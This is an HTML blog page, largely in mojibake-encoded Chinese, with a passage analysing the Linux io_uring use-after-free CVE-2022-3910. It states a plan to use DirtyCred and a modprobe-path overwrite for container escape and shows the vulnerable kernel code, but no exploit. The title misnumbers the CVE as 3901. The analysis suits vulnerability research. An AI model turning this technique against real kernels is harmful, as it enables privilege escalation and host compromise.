<!DOCTYPE html><html lang="en" data-default-color-scheme="auto"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/favicon_io/apple-touch-icon.png"><link rel="icon" href="/img/favicon_io/favicon.ico"><link rel="canonical" href="https://mundi-xu.github.io/2023/08/03/CVE-2022-3901-Container-Escape-via-File-based-DirtyCred/"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"><meta name="theme-color" content="#2f4154"><meta name="author" content="ç…Šå®‡"><meta name="keywords" content="LLM Security"><meta property="article:published_time" content="2023-08-02T16:05:21.000Z"><meta property="article:modified_time" content="2023-11-26T13:05:21.000Z"><meta property="article:section" content="Security Research"><meta property="article:tag" content="System Security"><meta property="article:tag" content="DirtyCred"><meta property="article:tag" content="linux"><meta property="article:tag" content="Kernel"><meta property="article:tag" content="CVE"><meta property="article:tag" content="Container Escape"><meta name="google-site-verification" content="8weHOmi2lqvnOxDE30WJFT51umo63nyCgfm8dXHNT5g"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><link rel="dns-prefetch" href="//at.alicdn.com"><link rel="dns-prefetch" href="//cdnjs.cloudflare.com"><link rel="dns-prefetch" href="//raw.githubusercontent.com"><link rel="dns-prefetch" href="//busuanzi.ibruce.info"><link rel="preconnect" href="https://at.alicdn.com" crossorigin><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin><link rel="preconnect" href="https://busuanzi.ibruce.info" crossorigin><link rel="dns-prefetch" href="//www.googletagmanager.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin><link rel="preload" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css" as="style" onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css"></noscript><link rel="preload" href="/css/main.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/events.js" as="script"><link rel="preload" href="/js/plugins.js" as="script"><link rel="preload" href="/js/boot.js" as="script"><link rel="preload" href="/js/img-lazyload.js" as="script"><meta name="description" content="è¯¦ç»†æ¢è®¨Linuxå†…æ ¸ä¸­CVE-2022-3910æ¼æ´åŠDirtyCredæŠ€æœ¯ï¼Œåˆ†æå…¶åœ¨ææƒå’Œå®¹å™¨é€ƒé€¸åœºæ™¯ä¸­çš„å…·ä½“åº”ç”¨ä¸æ”»å‡»åŸç†ã€‚"><meta property="og:type" content="article"><meta property="og:title" content="CVE-2022-3901ï¼šåˆ©ç”¨DirtyCredè¿›è¡Œå®¹å™¨é€ƒé€¸"><meta property="og:url" content="https://mundi-xu.github.io/2023/08/03/CVE-2022-3901-Container-Escape-via-File-based-DirtyCred/index.html"><meta property="og:site_name" content="Hanyin&#39;s Space"><meta property="og:description" content="è¯¦ç»†æ¢è®¨Linuxå†…æ ¸ä¸­CVE-2022-3910æ¼æ´åŠDirtyCredæŠ€æœ¯ï¼Œåˆ†æå…¶åœ¨ææƒå’Œå®¹å™¨é€ƒé€¸åœºæ™¯ä¸­çš„å…·ä½“åº”ç”¨ä¸æ”»å‡»åŸç†ã€‚"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://starlabs.sg/blog/2023/images/07-container-escape-using-file-based-DirtyCred_001.png"><meta property="og:image" content="https://starlabs.sg/blog/2023/images/07-container-escape-using-file-based-DirtyCred_003.png"><meta property="article:published_time" content="2023-08-02T16:05:21.000Z"><meta property="article:modified_time" content="2023-11-26T13:05:21.000Z"><meta property="article:author" content="ç…Šå®‡"><meta property="article:tag" content="CVE"><meta property="article:tag" content="Container Escape"><meta property="article:tag" content="DirtyCred"><meta property="article:tag" content="Kernel"><meta property="article:tag" content="System Security"><meta property="article:tag" content="linux"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://starlabs.sg/blog/2023/images/07-container-escape-using-file-based-DirtyCred_001.png"><meta name="format-detection" content="telephone=no"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hanyin&#39;s Space"><meta name="referrer" content="no-referrer-when-downgrade"><meta name="renderer" content="webkit"><meta http-equiv="X-UA-Compatible" content="IE=edge"><link rel="apple-touch-icon" sizes="180x180" href="/img/favicon_io/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/img/favicon_io/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/img/favicon_io/favicon-16x16.png"><link rel="manifest" href="/img/favicon_io/site.webmanifest"><script type="application/ld+json">{
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "CVE-2022-3901ï¼šåˆ©ç”¨DirtyCredè¿›è¡Œå®¹å™¨é€ƒé€¸",
    "author": {
      "@type": "Person",
      "name": "ç…Šå®‡"
    },
    "datePublished": "2023-08-02T16:05:21.000Z",
    
    "dateModified": "2023-11-26T13:05:21.000Z",
    
    "description": "è¯¦ç»†æ¢è®¨Linuxå†…æ ¸ä¸­CVE-2022-3910æ¼æ´åŠDirtyCredæŠ€æœ¯ï¼Œåˆ†æå…¶åœ¨ææƒå’Œå®¹å™¨é€ƒé€¸åœºæ™¯ä¸­çš„å…·ä½“åº”ç”¨ä¸æ”»å‡»åŸç†ã€‚",
    
    "publisher": {
      "@type": "Organization",
      "name": "Hanyin&#39;s Space",
      
      "logo": {
        "@type": "ImageObject",
        "url": "/img/favicon_io/favicon.ico"
      }
      
    },
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https://mundi-xu.github.io/2023/08/03/CVE-2022-3901-Container-Escape-via-File-based-DirtyCred/index.html"
    },
    
    "keywords": "System Security,DirtyCred,linux,Kernel,CVE,Container Escape",
    
    
    "articleBody": "CVE-2022-3910æ˜¯ä¸€ä¸ªio_uringä¸Šçš„UAFï¼Œå¯ä»¥é€šè¿‡DirtyCredå¾ˆæ–¹ä¾¿çš„ææƒï¼Œä½†æˆ‘ä»¬éœ€è¦è¦†ç›–/proc/sys/kernel/modprobeæ¥å°è¯•å®¹å™¨é€ƒé€¸ã€‚ æ–‡ä¸­ä»£ç ç‰‡æ®µæ¥è‡ªLinux kernel v6.0-rc5 io_uringç›¸å…³ç»„ä»¶ä»‹ç» io_uring å­ç³»ç»Ÿç”±Jens Axboeåˆ›å»ºï¼Œç”¨äºæé«˜ I/O æ“ä½œï¼ˆæ–‡ä»¶è¯»/å†™ã€socketå‘é€/æ¥æ”¶ï¼‰çš„æ€§èƒ½ã€‚ä¸€èˆ¬æ¥è¯´æ­¤ç±»éœ€è¦ä¸å†…æ ¸äº¤äº’çš„ I/O æ“ä½œä¼šä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ (syscall) ï¼Œä½†å› ä¸ºéœ€è¦åœ¨ç”¨æˆ·æ€å’Œå†…æ ¸æ€ä¹‹é—´è¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œä¼šäº§ç”Ÿå¤§é‡å¼€é”€ï¼Œå¯èƒ½ä¼šå¯¹æ‰§è¡Œå¤§é‡æ­¤ç±» I/O æ“ä½œçš„ç¨‹åºï¼ˆä¾‹å¦‚ Web æœåŠ¡å™¨ï¼‰äº§ç”Ÿå¾ˆå¤§çš„æ€§èƒ½æŸå¤±ã€‚ç›®å‰è®¡åˆ’å°†å…¶é›†æˆåˆ° NGINX Unit ä¸­ã€‚io_uring ç”±å†…æ ¸å­ç³»ç»Ÿï¼ˆä¸»è¦ä½äºfs/io_uring.cï¼‰å’Œç”¨æˆ·æ€åº“ï¼ˆliburingï¼‰ç»„æˆã€‚ io_uring ä¸ä¼šå¯¹æ¯ä¸ªè¯·æ±‚ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œæ˜¯é€šè¿‡æäº¤é˜Ÿåˆ— (SQ) å’Œå®Œæˆé˜Ÿåˆ— (CQ)ä¸¤ä¸ªç¯å½¢ç¼“å†²åŒºå®ç°ç”¨æˆ·å’Œå†…æ ¸æ€ä¹‹é—´çš„é€šä¿¡ã€‚ç”¨æˆ·æ€ç¨‹åºå°† I/O è¯·æ±‚æ”¾åœ¨ SQ ä¸Šï¼Œå†…æ ¸å°†å®ƒä»¬æ‹¿å‡ºæ¥å¹¶å¤„ç†ï¼Œå®Œæˆçš„è¯·æ±‚æ”¾åœ¨ CQ ä¸Šï¼ŒåŒ"
    
  }</script><title>CVE-2022-3901ï¼šåˆ©ç”¨DirtyCredè¿›è¡Œå®¹å™¨é€ƒé€¸ - Hanyin&#39;s Space</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/3.0.0/hint.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var dntVal,CONFIG={hostname:"mundi-xu.github.io",root:"/",version:"1.9.8",typing:{enable:!0,typeSpeed:80,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!0,offset_factor:3},web_analytics:{enable:!0,follow_dnt:!1,google:{measurement_id:"G-3847WCVNF2"}},search_path:"/local-search.json",include_content_in_search:!0};CONFIG.web_analytics.follow_dnt&&(dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on")))</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><script async>Fluid.ctx.dnt||Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-3847WCVNF2",function(){function a(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],a("js",new Date),a("config","G-3847WCVNF2")})</script><meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="Hanyin's Space" type="application/atom+xml">
</head><body><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>Hanyin&#39;s Space</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/" target="_self"><i class="iconfont icon-home-fill"></i> <span>Home</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/" target="_self"><i class="iconfont icon-archive-fill"></i> <span>Archives</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/" target="_self"><i class="iconfont icon-category-fill"></i> <span>Categories</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/" target="_self"><i class="iconfont icon-tags-fill"></i> <span>Tags</span></a></li><li class="nav-item"><a class="nav-link" href="/about/" target="_self"><i class="iconfont icon-user-fill"></i> <span>About</span></a></li><li class="nav-item"><a class="nav-link" href="/links/" target="_self"><i class="iconfont icon-link-fill"></i> <span>Links</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" rel="external nofollow noreferrer" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" rel="external nofollow noreferrer" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/img/banner.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="CVE-2022-3901ï¼šåˆ©ç”¨DirtyCredè¿›è¡Œå®¹å™¨é€ƒé€¸"></span></div><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2023-08-03 00:05" pubdate>August 3, 2023 am</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 9.2k words </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 77 mins </span><span id="busuanzi_container_page_pv" style="display:none"><i class="iconfont icon-eye" aria-hidden="true"></i> <span id="busuanzi_value_page_pv"></span> views</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar category-bar" style="margin-right:-1rem"><div class="category-list"><div class="category row nomargin-x"><a class="category-item list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Security Research" id="heading-ef1cd54fe461bafc9bc1f6892b96d498" role="tab" data-toggle="collapse" href="#collapse-ef1cd54fe461bafc9bc1f6892b96d498" aria-expanded="true">Security Research <span class="list-group-count">(11)</span> <i class="iconfont icon-arrowright"></i></a><div class="category-collapse collapse show" id="collapse-ef1cd54fe461bafc9bc1f6892b96d498" role="tabpanel" aria-labelledby="heading-ef1cd54fe461bafc9bc1f6892b96d498"><div class="category-post-list"><a href="/2023/08/03/CVE-2022-3901-Container-Escape-via-File-based-DirtyCred/" title="CVE-2022-3901ï¼šåˆ©ç”¨DirtyCredè¿›è¡Œå®¹å™¨é€ƒé€¸" class="list-group-item list-group-item-action active"><span class="category-post">CVE-2022-3901ï¼šåˆ©ç”¨DirtyCredè¿›è¡Œå®¹å™¨é€ƒé€¸</span> </a><a href="/2022/10/08/DirtyCred/" title="DirtyCredä¸CVE-2021-4154æ¼æ´åˆ†æ" class="list-group-item list-group-item-action"><span class="category-post">DirtyCredä¸CVE-2021-4154æ¼æ´åˆ†æ</span> </a><a href="/2021/11/30/Architectural-Support-for-System-Security/" title="Architectural Support for System Security" class="list-group-item list-group-item-action"><span class="category-post">Architectural Support for System Security</span> </a><a href="/2021/11/29/why-ml-fails-security/" title="ã€è½¬è½½ã€‘ä¸ºä»€ä¹ˆæœºå™¨å­¦ä¹ è§£å†³ç½‘ç»œå®‰å…¨é—®é¢˜æ€»æ˜¯å¤±è´¥" class="list-group-item list-group-item-action"><span class="category-post">ã€è½¬è½½ã€‘ä¸ºä»€ä¹ˆæœºå™¨å­¦ä¹ è§£å†³ç½‘ç»œå®‰å…¨é—®é¢˜æ€»æ˜¯å¤±è´¥</span> </a><a href="/2021/11/26/Common-vulnerabilities-mitigation-measures/" title="å¸¸è§æ¼æ´ç¼“è§£æªæ–½" class="list-group-item list-group-item-action"><span class="category-post">å¸¸è§æ¼æ´ç¼“è§£æªæ–½</span> </a><a href="/2021/07/15/Chromium-component-risk-analysis/" title="ã€è½¬è½½ã€‘æ”»é˜²å¯ç¤ºï¼šChromium ç»„ä»¶é£é™©å‰–æä¸æ”¶æ•›" class="list-group-item list-group-item-action"><span class="category-post">ã€è½¬è½½ã€‘æ”»é˜²å¯ç¤ºï¼šChromium ç»„ä»¶é£é™©å‰–æä¸æ”¶æ•›</span> </a><a href="/2021/02/23/recent-technology-of-symbolic-execution/" title="ã€è½¬è½½ã€‘å¸¦ä½ ææ‡‚ç¬¦å·æ‰§è¡Œçš„å‰ä¸–ä»Šç”Ÿä¸æœ€è¿‘æŠ€æœ¯" class="list-group-item list-group-item-action"><span class="category-post">ã€è½¬è½½ã€‘å¸¦ä½ ææ‡‚ç¬¦å·æ‰§è¡Œçš„å‰ä¸–ä»Šç”Ÿä¸æœ€è¿‘æŠ€æœ¯</span> </a><a href="/2021/01/01/A-brief-analysis-of-PayBreak-anti-ransomware-system/" title="PayBreaké˜²å‹’ç´¢ç³»ç»Ÿç®€æ" class="list-group-item list-group-item-action"><span class="category-post">PayBreaké˜²å‹’ç´¢ç³»ç»Ÿç®€æ</span> </a><a href="/2020/12/28/Research-on-Ransomware-Structure-and-Encryption-Mode/" title="å‹’ç´¢è½¯ä»¶ç»“æ„ä¸åŠ å¯†æ¨¡å¼ç ”ç©¶" class="list-group-item list-group-item-action"><span class="category-post">å‹’ç´¢è½¯ä»¶ç»“æ„ä¸åŠ å¯†æ¨¡å¼ç ”ç©¶</span> </a><a href="/2020/12/27/A-Brief-Analysis-of-Cryptographic-Algorithm-RUST/" title="å¯†ç å­¦åˆæ¢-åŸºäºRUSTçš„å¯†ç ç³»ç»Ÿä¸ç®—æ³•ç®€æ" class="list-group-item list-group-item-action"><span class="category-post">å¯†ç å­¦åˆæ¢-åŸºäºRUSTçš„å¯†ç ç³»ç»Ÿä¸ç®—æ³•ç®€æ</span> </a><a href="/2020/07/01/Blockchain-based-security-log-system/" title="åŸºäºåŒºå—é“¾çš„å®‰å…¨æ—¥å¿—ç³»ç»Ÿ" class="list-group-item list-group-item-action"><span class="category-post">åŸºäºåŒºå—é“¾çš„å®‰å…¨æ—¥å¿—ç³»ç»Ÿ</span></a></div></div></div></div></aside></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 id="seo-header">CVE-2022-3901ï¼šåˆ©ç”¨DirtyCredè¿›è¡Œå®¹å™¨é€ƒé€¸</h1><p id="updated-time" class="note note-primary" style="display:none">Last updated on 2023-11-26T21:05:21+08:00</p><div class="markdown-body"><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-3910">CVE-2022-3910</a>æ˜¯ä¸€ä¸ªio_uringä¸Šçš„UAFï¼Œå¯ä»¥é€šè¿‡DirtyCredå¾ˆæ–¹ä¾¿çš„ææƒï¼Œä½†æˆ‘ä»¬éœ€è¦è¦†ç›–<code>/proc/sys/kernel/modprobe</code>æ¥å°è¯•å®¹å™¨é€ƒé€¸ã€‚</p><p>æ–‡ä¸­ä»£ç ç‰‡æ®µæ¥è‡ªLinux kernel v6.0-rc5</p><h1 id="io_uringç›¸å…³ç»„ä»¶ä»‹ç»">io_uringç›¸å…³ç»„ä»¶ä»‹ç»</h1><p>io_uring å­ç³»ç»Ÿç”±<a target="_blank" rel="noopener external nofollow noreferrer" href="https://twitter.com/axboe">Jens Axboe</a>åˆ›å»ºï¼Œç”¨äºæé«˜ I/O æ“ä½œï¼ˆæ–‡ä»¶è¯»/å†™ã€socketå‘é€/æ¥æ”¶ï¼‰çš„æ€§èƒ½ã€‚ä¸€èˆ¬æ¥è¯´æ­¤ç±»éœ€è¦ä¸å†…æ ¸äº¤äº’çš„ I/O æ“ä½œä¼šä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ (syscall) ï¼Œä½†å› ä¸ºéœ€è¦åœ¨ç”¨æˆ·æ€å’Œå†…æ ¸æ€ä¹‹é—´è¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œä¼šäº§ç”Ÿå¤§é‡å¼€é”€ï¼Œå¯èƒ½ä¼šå¯¹æ‰§è¡Œå¤§é‡æ­¤ç±» I/O æ“ä½œçš„ç¨‹åºï¼ˆä¾‹å¦‚ Web æœåŠ¡å™¨ï¼‰äº§ç”Ÿå¾ˆå¤§çš„æ€§èƒ½æŸå¤±ã€‚ç›®å‰<a target="_blank" rel="noopener" href="https://github.com/nginx/unit/issues/511">è®¡åˆ’</a>å°†å…¶é›†æˆåˆ° NGINX Unit ä¸­ã€‚io_uring ç”±å†…æ ¸å­ç³»ç»Ÿï¼ˆä¸»è¦ä½äº<code>fs/io_uring.c</code>ï¼‰å’Œç”¨æˆ·æ€åº“ï¼ˆ<a target="_blank" rel="noopener" href="https://github.com/axboe/liburing">liburing</a>ï¼‰ç»„æˆã€‚</p><p>io_uring ä¸ä¼šå¯¹æ¯ä¸ªè¯·æ±‚ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œæ˜¯é€šè¿‡æäº¤é˜Ÿåˆ— (SQ) å’Œå®Œæˆé˜Ÿåˆ— (CQ)ä¸¤ä¸ªç¯å½¢ç¼“å†²åŒºå®ç°ç”¨æˆ·å’Œå†…æ ¸æ€ä¹‹é—´çš„é€šä¿¡ã€‚ç”¨æˆ·æ€ç¨‹åºå°† I/O è¯·æ±‚æ”¾åœ¨ SQ ä¸Šï¼Œå†…æ ¸å°†å®ƒä»¬æ‹¿å‡ºæ¥å¹¶å¤„ç†ï¼Œå®Œæˆçš„è¯·æ±‚æ”¾åœ¨ CQ ä¸Šï¼ŒåŒæ—¶å…è®¸ç”¨æˆ·æ€ç¨‹åºæŸ¥çœ‹å¤„ç†çš„ç»“æœã€‚</p><p>SQå’ŒCQæ“ä½œæ˜¯å¼‚æ­¥çš„ï¼šå‘SQæ·»åŠ è¯·æ±‚æ°¸è¿œä¸ä¼šé˜»å¡ï¼Œé™¤éé˜Ÿåˆ—å·²æ»¡ã€‚</p><p>io_uring å¯ä»¥é…ç½®ä¸ºè½®è¯¢SQ æ˜¯å¦æœ‰æ–°è¯·æ±‚ï¼Œæˆ–è€…ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨<code>io_uring_enter</code>æ¥é€šçŸ¥å†…æ ¸å­˜åœ¨æ–°è¯·æ±‚ã€‚ç„¶åå†…æ ¸å¯ä»¥åœ¨å½“å‰çº¿ç¨‹ä¸­å¤„ç†è¯¥è¯·æ±‚ï¼Œæˆ–è€…å°†å…¶å§”æ‰˜ç»™å…¶ä»–å†…æ ¸å·¥ä½œçº¿ç¨‹ã€‚</p><p><a target="_blank" rel="noopener" href="https://kernel-recipes.org/en/2022/wp-content/uploads/2022/06/axboe-kr2022-1.pdf">Jens Axboe çš„å¹»ç¯ç‰‡ä¸­</a>ä»‹ç»äº†æ¼æ´ç›¸å…³çš„ä¸¤ä¸ªé‡è¦ç»„ä»¶ã€‚</p><h2 id="fixed-files">Fixed files</h2><p>Fixed files, or direct descriptors, <a target="_blank" rel="noopener" href="https://lwn.net/Articles/863071/">å¯ä»¥è¢«çœ‹ä½œ io_uring ç‰¹å®šçš„æ–‡ä»¶æè¿°ç¬¦</a>.io_uring ä¼šç»´æŠ¤æ‰€æœ‰å·²æ³¨å†Œæ–‡ä»¶çš„å¼•ç”¨æ¥å‡å°‘æ“ä½œæ–‡ä»¶æè¿°ç¬¦å¯¼è‡´çš„é¢å¤–å¼€é”€ï¼Œåªæœ‰å½“fixed filesæœªæ³¨å†Œæˆ– io_uring å®ä¾‹è¢«å…³é—­ä¹‹åæ‰ä¼šé‡Šæ”¾æ­¤å¼•ç”¨ã€‚</p><h2 id="ring-messages">Ring messages</h2><p>io_uring æ”¯æŒç¯ä¹‹é—´çš„æ¶ˆæ¯ä¼ é€’<code>io_uring_prep_msg_ring()</code>ã€‚æ ¹æ®<a target="_blank" rel="noopener" href="https://man.archlinux.org/man/extra/liburing/io_uring_prep_msg_ring.3.en">æ–‡æ¡£</a>æ‰€è¿°ï¼Œæ­¤æ“ä½œä¼šåœ¨ç›®æ ‡ç¯ä¸­åˆ›å»ºä¸€ä¸ª CQEï¼Œå¹¶å°†å…¶<code>res</code>å’Œ<code>user_data</code>è®¾ç½®ä¸ºç”¨æˆ·æŒ‡å®šçš„å€¼ã€‚</p><p><a target="_blank" rel="noopener" href="https://github.com/axboe/liburing/wiki/io_uring-and-networking-in-2023#ring-messages">å¦‚æ­¤å¤„</a>æ‰€è¿°ï¼Œæ­¤åŠŸèƒ½å¯ç”¨äºå”¤é†’åœ¨ç¯ä¸Šç­‰å¾…çš„ä¼‘çœ ä»»åŠ¡ï¼Œæˆ–è€…åªæ˜¯ä¼ é€’ä»»æ„ä¿¡æ¯ã€‚</p><h1 id="cve-2022-3910">CVE-2022-3910</h1><p>CVE-2022-3910 æ˜¯å› ä¸º<code>io_msg_ring()</code>å‡½æ•°ä¸æ­£ç¡®çš„æ›´æ–°å¼•ç”¨è®¡æ•°ã€‚æºæ–‡ä»¶åœ¨<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/io_uring/msg_ring.c">è¿™é‡Œ</a>ï¼Œç›¸å…³ä»£ç ç‰‡æ®µå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">io_msg_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_kiocb *req, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> issue_flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_msg</span> *<span class="hljs-title">msg</span> =</span> io_kiocb_to_cmd(req, <span class="hljs-keyword">struct</span> io_msg);<br>	<span class="hljs-type">int</span> ret;<br><br>	ret = -EBADFD;<br>	<span class="hljs-keyword">if</span> (!io_is_uring_fops(req-&gt;file))<br>		<span class="hljs-keyword">goto</span> done;<br><br>	<span class="hljs-keyword">switch</span> (msg-&gt;cmd) &#123;<br>	<span class="hljs-keyword">case</span> IORING_MSG_DATA:<br>		ret = io_msg_ring_data(req);<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> IORING_MSG_SEND_FD:<br>		ret = io_msg_send_fd(req, issue_flags);<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">default</span>:<br>		ret = -EINVAL;<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br><br>done:<br>	<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>		req_set_fail(req);<br>	io_req_set_res(req, ret, <span class="hljs-number">0</span>);<br>	<span class="hljs-comment">/* put file to avoid an attempt to IOPOLL the req */</span><br>	io_put_file(req-&gt;file);<br>	req-&gt;file = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">return</span> IOU_OK;<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/fc7222c3a9f56271fba02aabbfbae999042f1679">patch</a>ä¸­æ‰¾å¯ä»¥äº†è§£è¯¦ç»†çš„é—®é¢˜åŸå› ã€‚</p><p><img lazyload src="/img/loading.gif" data-src="https://starlabs.sg/blog/2023/images/07-container-escape-using-file-based-DirtyCred_001.png"></p><p>é€šå¸¸io_uring çš„æ¶ˆæ¯ä¼ é€’åŠŸèƒ½éœ€è¦ä¸å¦ä¸€ä¸ª io_uring å®ä¾‹å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦ã€‚å¦‚æœæˆ‘ä»¬ä¼ å…¥å…¶ä»–å¼•ç”¨ï¼Œå°±åªä¼šè°ƒç”¨<code>io_put_file()</code>å¹¶è¿”å›é”™è¯¯ã€‚</p><p>å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªFixed filesï¼Œ<code>io_put_file()</code>ä»ç„¶ä¼šè¢«è°ƒç”¨ï¼Œå¯¼è‡´å¼•ç”¨æ•°-1ï¼Œä½†å®é™…ä¸Šæˆ‘ä»¬æ²¡æœ‰è·å–å¯¹è¯¥æ–‡ä»¶çš„é¢å¤–å¼•ç”¨ã€‚</p><h2 id="æ¼æ´å½±å“">æ¼æ´å½±å“</h2><p><code>io_put_file()</code>æ˜¯<code>fput()</code>çš„wrapperã€‚åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/file_table.c#L374">æºç </a>ï¼Œä¸»è¦ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fput</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br>	<span class="hljs-keyword">if</span> (atomic_long_dec_and_test(&amp;file-&gt;f_count)) &#123;<br>		<span 